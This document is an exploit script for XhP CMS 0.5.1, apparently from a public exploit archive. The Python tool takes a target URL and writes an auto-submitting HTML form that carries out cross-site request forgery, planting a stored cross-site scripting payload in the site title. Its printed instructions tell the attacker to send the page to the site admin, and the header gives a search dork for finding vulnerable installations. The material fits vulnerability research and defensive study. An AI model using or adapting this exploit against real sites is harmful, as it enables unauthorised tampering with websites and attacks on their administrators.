# Exploit Title: XhP CMS 0.5.1 - Cross-Site Request Forgery to Persistent Cross-Site Scripting
# Exploit Author: Ahsan Tahir
# Date: 19-10-2016
# Software Link: https://sourceforge.net/projects/xhp/
# Vendor: https://sourceforge.net/projects/xhp/
# Google Dork: inurl:Powered by XHP CMS
# Contact: https://twitter.com/AhsanTahirAT | https://facebook.com/ahsantahiratofficial
# Website: www.ahsan-tahir.com
# Category: webapps
# Version: 0.5.1
# Tested on: [Kali Linux 2.0 | Windows 8.1]
# Email: mrahsan1337@gmail.com

import os
import urllib

if os.name == 'nt':
		os.system('cls')
else:
	os.system('clear')

banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-=-=-=+
|  __  ___     ____     ____ __  __ ____      |
|  \ \/ / |__ |  _ \   / ___|  \/  / ___|     |
|   \  /| '_ \| |_) | | |   | |\/| \___ \     |
|   /  \| | | |  __/  | |___| |  | |___) |    |
|  /_/\_\_| |_|_|      \____|_|  |_|____/     | 
| > XhP CMS 0.5.1 - CSRF to Persistent XSS    |
| > Exploit Author & Script Coder: Ahsan Tahir|
+=====-----=====-----======-----=====---==-=-=+ 
'''
def xhpcsrf():

	print banner

	url = str(raw_input(" [+] Enter The Target URL (Please include http:// or https://): "))

	csrfhtmlcode = '''
	<html>
	  <!-- CSRF PoC -->
	  <body>
	    <form action="http://%s/action.php?module=users&action=process_general_config&box_id=29&page_id=0&basename=index.php&closewindow=&from_page=page=0&box_id=29&action=display_site_settings&errcode=0" method="POST" enctype="multipart/form-data" name="exploit">
	      <input type="hidden" name="frmPageTitle" value=""accesskey&#61;z&#32;onclick&#61;"alert&#40;document&#46;domain&#41;" />
	      <input type="hidden" name="frmPageUrl" value="http&#58;&#47;&#47;localhost&#47;xhp&#47;" />
	      <input type="hidden" name="frmPageDescription" value="&#13;" />
	      <input type="hidden" name="frmLanguage" value="english" />
	      <input type="submit" value="Submit request" />
	    </form>
		<script type="text/javascript" language="JavaScript">
		//submit form
		document.exploit.submit();
		</script>    
	  </body>
	</html>

	''' % url

	print " +----------------------------------------------------+\n [!] The HTML exploit code for exploiting this CSRF has been created."

	print(" [!] Enter your Filename below\n Note: The exploit will be saved as 'filename'.html \n")
	extension = ".html"
	name = raw_input(" Filename: ")
	filename = name+extension
	file = open(filename, "w")

	file.write(csrfhtmlcode)
	file.close()
	print(" [+] Your exploit is saved as %s")%filename
	print(" [+] Further Details:\n [!] The code saved in %s will automatically submit without\n any user interaction\n [!] To fully exploit, send the admin of this site a webpage with\n the above code injected in it, when he/she will open it the\n title of their website will be\n changed to an XSS payload, and then\n go to %s and hit ALT+SHIFT+Z on your keyboard, boom! XSS will pop-up!") %(filename, url)
	print("")
	
xhpcsrf()